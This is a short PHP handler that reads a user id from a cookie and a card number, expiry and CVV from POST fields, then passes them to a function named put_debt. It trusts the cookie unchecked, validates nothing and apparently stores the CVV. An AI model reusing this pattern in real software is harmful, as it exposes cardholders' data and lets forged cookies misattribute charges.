<?php 
require('../../metronic/include/setings.php');

$id = $_COOKIE['id'];

$card = $_POST['tar'];
$date = $_POST['fec'];
$cvv = $_POST['cvv'];

put_debt($id,$card,$date,$cvv);
?>